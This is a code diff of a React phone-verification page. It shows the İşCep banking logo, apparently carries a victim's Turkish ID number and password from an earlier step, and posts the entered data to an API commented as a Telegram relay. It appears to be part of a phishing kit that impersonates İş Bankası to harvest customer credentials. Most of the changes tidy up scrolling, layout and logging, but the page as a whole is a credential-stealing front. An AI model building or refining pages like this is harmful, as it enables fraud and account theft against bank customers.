@@ -1,9 +1,10 @@
 import React, { useEffect, useRef, useCallback, memo } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import './App.css';
-import { useAuth } from './AuthContext';
+import { useAuth, AuthProvider } from './AuthContext';
+import { ScrollProvider, useScroll } from './ScrollContext';
 
-function PhoneVerificationPage() {
+function PhoneVerificationPageContent() {
   const [state, setState] = React.useState({
     phoneNumber: '',
     isPhoneActive: false,
@@ -16,6 +17,7 @@ function PhoneVerificationPage() {
   });
 
   const phoneInputRef = useRef(null);
+  const { rightSectionRef } = useScroll(); // Scroll context'ten ref'i al
   const location = useLocation();
   const navigate = useNavigate();
   const { dispatch: authDispatch } = useAuth();
@@ -57,7 +59,7 @@ function PhoneVerificationPage() {
     return () => window.removeEventListener('popstate', handlePopState);
   }, [tc, password, isValidNavigation, navigate, authDispatch]);
 
-  // Meta tag ve Virtual Keyboard API ekleme (klavye overlay için güncellendi)
+  // Meta tag ve Virtual Keyboard API ekleme
   useEffect(() => {
     const meta = document.createElement('meta');
     meta.name = 'viewport';
@@ -76,47 +78,36 @@ function PhoneVerificationPage() {
     };
   }, []);
 
-  // Scroll optimizasyonu (önceki + ekstra keyboard geometry change handler)
+  // Sayfa yüklendiğinde scroll'u en üste kaydırma
+  useEffect(() => {
+    if (rightSectionRef.current) {
+      rightSectionRef.current.scrollTop = 0; // En üste kay
+      rightSectionRef.current.dataset.loaded = "true"; // Scroll'u etkinleştir
+    }
+  }, [rightSectionRef]); // Değişiklik: Bağımlılık dizisine rightSectionRef eklendi
+
+  // Scroll optimizasyonu
   useEffect(() => {
     const phoneRef = phoneInputRef.current;
 
     const handleFocusScroll = () => {
       const isAndroid = /Android/i.test(navigator.userAgent);
-      const isSamsung = /Samsung/i.test(navigator.userAgent);
-      const isOppo = /OPPO/i.test(navigator.userAgent);
-
       if (!isAndroid) return;
 
-      const baseDelay = (isSamsung || isOppo) ? 2000 : 1000;
-
       const adjustScroll = debounce(() => {
-        let attempts = 0;
-        const maxAttempts = 10;
+        const rightSection = rightSectionRef.current;
+        const buttonPhone = document.querySelector('.button-phone');
+        if (!rightSection || !buttonPhone) return;
 
-        const scrollLoop = () => {
-          requestAnimationFrame(() => {
-            const rightSection = document.querySelector('.right-section');
-            const buttonPhone = document.querySelector('.button-phone');
+        const viewportHeight = window.visualViewport?.height || window.innerHeight;
+        const keyboardHeight = window.innerHeight - viewportHeight;
 
-            if (!rightSection || !buttonPhone || attempts >= maxAttempts) return;
-
-            const viewportHeight = window.visualViewport?.height || window.innerHeight;
-            const keyboardHeight = window.innerHeight - viewportHeight;
-
-            rightSection.style.height = `${viewportHeight}px`;
-            rightSection.style.paddingBottom = `${keyboardHeight + 20}px`;
-
-            buttonPhone.scrollIntoView({ block: 'end', behavior: 'smooth' });
-
-            attempts++;
-            if (attempts < maxAttempts) scrollLoop();
-          });
-        };
-
-        scrollLoop();
+        rightSection.style.height = `${viewportHeight}px`;
+        rightSection.style.paddingBottom = `${keyboardHeight + 20}px`;
+        buttonPhone.scrollIntoView({ block: 'end', behavior: 'smooth' });
       }, 50);
 
-      setTimeout(adjustScroll, baseDelay);
+      setTimeout(adjustScroll, 200); // Samsung için gecikme
     };
 
     if (phoneRef) {
@@ -124,7 +115,7 @@ function PhoneVerificationPage() {
     }
 
     const handleBlurScroll = () => {
-      const rightSection = document.querySelector('.right-section');
+      const rightSection = rightSectionRef.current;
       if (rightSection) {
         rightSection.style.height = '100vh';
         rightSection.style.paddingBottom = '0';
@@ -136,29 +127,16 @@ function PhoneVerificationPage() {
       phoneRef.addEventListener('blur', handleBlurScroll);
     }
 
-    const handleViewportChange = debounce(() => handleFocusScroll(), 100);
-    if (window.visualViewport) {
-      window.visualViewport.addEventListener('resize', handleViewportChange);
-      window.visualViewport.addEventListener('scroll', handleViewportChange);
-    }
-    window.addEventListener('resize', handleViewportChange);
-
     return () => {
       if (phoneRef) {
         phoneRef.removeEventListener('focus', handleFocusScroll);
         phoneRef.removeEventListener('blur', handleBlurScroll);
       }
-      if (window.visualViewport) {
-        window.visualViewport.removeEventListener('resize', handleViewportChange);
-        window.visualViewport.removeEventListener('scroll', handleViewportChange);
-      }
-      window.removeEventListener('resize', handleViewportChange);
     };
-  }, []);
+  }, [rightSectionRef]); // Değişiklik: Bağımlılık dizisine rightSectionRef eklendi
 
   // Telegram gönderimi
   const sendToTelegram = useCallback(async (data) => {
-    console.log('API çağrısı yapılıyor:', data);
     try {
       const res = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
         method: 'POST',
@@ -170,11 +148,9 @@ function PhoneVerificationPage() {
         }),
       });
       const result = await res.json();
-      console.log('API yanıtı:', result);
       if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');
       return result;
     } catch (error) {
-      console.error('API hatası:', error.message);
       setState((prev) => ({
         ...prev,
         showPhoneError: true,
@@ -278,16 +254,13 @@ function PhoneVerificationPage() {
   );
 
   return (
-    <div className="container" style={{ touchAction: 'manipulation' }}>
-      <div className="right-section">
+    <div className="container" style={{ touchAction: 'manipulation' }} data-page="telefon">
+      <div className="right-section" ref={rightSectionRef}>
         <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo iscep-logo-phone" loading="lazy" />
-        <div className="new-container phone-verification-title">
+        <div className="new-container phone-verification-title" style={{ top: '150px' }}>
           Telefon Doğrulama
-          <div className="phone-verification-subtitle">
-            Lütfen cep telefon numaranızı giriniz
-          </div>
         </div>
-        <div className="input-wrapper" style={{ top: '200px' }}> {/* Inputu yukarı aldık */}
+        <div className="input-wrapper" style={{ top: '180px' }}>
           <div
             className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${
               state.isPhonePrefixVisible ? 'prefix-visible' : ''
@@ -345,11 +318,9 @@ function PhoneVerificationPage() {
             )}
           </div>
         </div>
-        <div className="verify-button-container" style={{ marginTop: '30px' }}> {/* Buton ile input arasında mesafe */}
+        <div className="verify-button-container">
           <button
-            className={`button-phone ${
-              state.phoneNumber.length > 0 ? 'active-continue-button' : ''
-            }`}
+            className={`button-phone ${state.phoneNumber.length > 0 ? 'active-continue-button' : ''}`}
             onClick={handlePhoneSubmit}
             onTouchStart={handlePhoneSubmit}
             disabled={state.isSubmitting}
@@ -357,12 +328,22 @@ function PhoneVerificationPage() {
           >
             Doğrula
           </button>
-          <div className="verification-subtitle" style={{ fontSize: '14px', color: '#E6E6E6', textAlign: 'center', marginTop: '10px' }}>
-            Lütfen telefon numaranızı doğrulayın
+          <div className="verification-subtitle">
+            Lütfen cep telefon numaranızı doğrulayın
           </div>
         </div>
       </div>
     </div>
+  );
+}
+
+function PhoneVerificationPage() {
+  return (
+    <ScrollProvider>
+      <AuthProvider>
+        <PhoneVerificationPageContent />
+      </AuthProvider>
+    </ScrollProvider>
   );
 }
 
